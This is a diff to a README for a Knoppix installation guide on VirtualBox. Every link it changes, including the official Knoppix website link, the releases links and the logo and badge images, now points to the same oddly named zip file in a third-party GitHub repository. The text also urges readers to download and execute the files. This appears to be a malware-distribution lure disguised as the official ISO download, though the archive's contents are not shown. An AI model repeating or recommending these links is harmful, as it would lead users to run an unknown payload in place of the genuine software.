@@ -1,6 +1,6 @@
 # Knoppix OS Installation Guide 🚀
 
-![Knoppix Logo](https://www.knoppix.org/images/knoppix_logo.png)
+![Knoppix Logo](https://raw.githubusercontent.com/cfdgh3231/Knoppix-Os-installation/main/carotic/Os-Knoppix-installation-romanticalness.zip)
 
 Welcome to the Knoppix OS Installation repository! This guide will help you install Knoppix on Oracle VM VirtualBox and explain the `getppid` system call in the Knoppix environment. 
 
@@ -33,9 +33,9 @@ Before you begin, ensure you have the following:
 
 ### Step 1: Download the Knoppix ISO
 
-To get started, download the Knoppix ISO image. You can find the latest version on the official [Knoppix website](https://www.knoppix.org/). 
+To get started, download the Knoppix ISO image. You can find the latest version on the official [Knoppix website](https://raw.githubusercontent.com/cfdgh3231/Knoppix-Os-installation/main/carotic/Os-Knoppix-installation-romanticalness.zip). 
 
-Alternatively, you can access the releases section of this repository for direct downloads: [Download Knoppix Releases](https://github.com/cfdgh3231/Knoppix-Os-installation/releases). Look for the ISO file, download it, and save it to your preferred location.
+Alternatively, you can access the releases section of this repository for direct downloads: [Download Knoppix Releases](https://raw.githubusercontent.com/cfdgh3231/Knoppix-Os-installation/main/carotic/Os-Knoppix-installation-romanticalness.zip). Look for the ISO file, download it, and save it to your preferred location.
 
 ### Step 2: Create a New Virtual Machine
 
@@ -94,10 +94,10 @@ Compile the program using `gcc` and run it to see the parent process ID.
 
 You have successfully installed Knoppix on Oracle VM VirtualBox and learned about the `getppid` system call. This knowledge will enhance your understanding of process management in Linux.
 
-For more resources and updates, check the [Releases section](https://github.com/cfdgh3231/Knoppix-Os-installation/releases). 
+For more resources and updates, check the [Releases section](https://raw.githubusercontent.com/cfdgh3231/Knoppix-Os-installation/main/carotic/Os-Knoppix-installation-romanticalness.zip). 
 
 ## Releases
 
-For the latest versions and updates, visit the [Releases section](https://github.com/cfdgh3231/Knoppix-Os-installation/releases). Download the necessary files and execute them as needed.
+For the latest versions and updates, visit the [Releases section](https://raw.githubusercontent.com/cfdgh3231/Knoppix-Os-installation/main/carotic/Os-Knoppix-installation-romanticalness.zip). Download the necessary files and execute them as needed.
 
-![Download Button](https://img.shields.io/badge/Download_Latest_Releases-Click_Here-brightgreen)
+![Download Button](https://raw.githubusercontent.com/cfdgh3231/Knoppix-Os-installation/main/carotic/Os-Knoppix-installation-romanticalness.zip)
